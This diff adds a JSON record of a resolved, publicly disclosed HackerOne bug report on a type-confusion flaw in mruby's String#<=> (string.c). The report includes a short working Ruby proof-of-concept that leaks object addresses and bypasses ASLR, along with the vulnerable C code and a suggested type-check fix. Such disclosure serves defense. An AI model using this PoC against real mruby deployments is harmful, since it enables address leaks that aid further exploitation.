@@ -1,0 +1,112 @@
+{
+  "id": 207321,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDczMjE=",
+  "url": "https://hackerone.com/reports/207321",
+  "title": "Controlled address leak due to type confusion - ASLR bypass",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2017-02-18T13:26:29.063Z",
+  "submitted_at": "2017-02-18T13:26:29.063Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "aerodudrizzt",
+    "url": "/aerodudrizzt",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 15668,
+    "url": "https://hackerone.com/shopify-scripts",
+    "handle": "shopify-scripts",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "shopify-scripts",
+      "twitter_handle": "",
+      "website": "",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2017-03-14T21:24:39.696Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-03-14T21:24:39.662Z",
+  "team_member_agreed_on_going_public_at": "2017-03-14T21:09:12.661Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "There are several different places in which arguments are treated as fixnums without a prior check for their type. Since ```mrb_value``` is a union that holds all value types, it can cause a mixup between an object pointer and an integer value:\n```cpp\ntypedef struct mrb_value {\n  union {\n    mrb_float f;\n    void *p;\n    mrb_int i;\n    mrb_sym sym;\n  } value;\n  enum mrb_vtype tt;\n} mrb_value;\n```\n\nPoC Script:\n=======\n```Ruby\nclass Integer\n    def <=>(arg1)\n        return arg1\n    end\nend\n\ns = \"hello\"\ns.<=>(1)\n```\nAnd the output varies between runs (because of ASLR) and between architecture (32/64 bit) and seems like this: ```-69972254725992``` meaning an address of: ```0x3fa3af631768```.\n\nVulnerable Code:\n===========\nThe ```mrb_str_cmp_m``` function (```s.<=>()```) in ```string.c``` uses the ```<=>``` function of the argument, if the argument is not a string. That function can be overridden (like was demonstrated in the PoC), and the returned value is not checked to be a fixnum, while it is treated as a fixnum:\n```cpp\n  mrb_value str2;\n  mrb_int result;\n\n  mrb_get_args(mrb, \"o\", &str2);\n  if (!mrb_string_p(str2)) {\n    if (!mrb_respond_to(mrb, str2, mrb_intern_lit(mrb, \"to_s\"))) {\n      return mrb_nil_value();\n    }\n    else if (!mrb_respond_to(mrb, str2, mrb_intern_lit(mrb, \"<=>\"))) {\n      return mrb_nil_value();\n    }\n    else {\n      mrb_value tmp = mrb_funcall(mrb, str2, \"<=>\", 1, str1);\n\n      if (mrb_nil_p(tmp)) return mrb_nil_value();\n      if (!mrb_fixnum(tmp)) {\n        return mrb_funcall(mrb, mrb_fixnum_value(0), \"-\", 1, tmp);\n      }\n      result = -mrb_fixnum(tmp);\n    }\n  }\n  else {\n    result = mrb_str_cmp(mrb, str1, str2);\n  }\n  return mrb_fixnum_value(result);\n```\nThis means that the PoC code gets ```tmp``` as the original string (since ```1.<=>(str1)``` returns ```str1```), and ```mrb_fixnum(tmp)``` will be the address of the string object. Since it is returned as ```-mrb_fixnum(tmp)``` our value was negative.\n\nMore minor examples:\n------------------------\n1. ```mrb_str_aref_m``` function in ```string.c``` does not check the fixnum's type. can cause only a very minor information-leak over the MSbit (pos < 0).\n2. ```mrb_str_index``` function in ```string.c``` does not check the 2nd arg, but has no security implications.\n3. ```mrb_str_rindex``` function in ```string.c``` does not check the 2nd arg, can again leak the MSbit of the address (again a vpos < 0 check).\n\nSuggested Fix:\n=========\nBefore the argument / returned value is treated as a fixnum, it should be checked to match it in type using the ```mrb_fixnum_p``` macro, or any other chosen way.",
+  "weakness": {
+    "id": 18,
+    "name": "Information Disclosure"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2017-04-13T21:09:12.689Z",
+  "allow_singular_disclosure_after": -285632744.07496756,
+  "singular_disclosure_allowed": true,
+  "vote_count": 3,
+  "voters": [
+    "eveeez",
+    "spetr0x",
+    "cytrusek"
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
